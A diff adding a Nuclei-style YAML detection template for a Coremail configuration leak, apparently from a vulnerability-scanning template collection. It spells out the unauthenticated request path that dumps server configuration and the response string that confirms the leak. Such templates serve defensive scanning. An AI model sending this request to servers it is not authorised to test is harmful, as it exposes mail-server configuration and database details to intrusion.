@@ -1,0 +1,21 @@
+id: coremail-config-leak
+info:
+  name: Coremail Configuration Leak
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Detects a configuration information leak in Coremail via the /mailsms/s?func=ADMIN:appState&dumpConfig=/ endpoint.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/mailsms/s?func=ADMIN:appState&dumpConfig=/"
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<object name=\"cm_md_db\">"
+        part: body
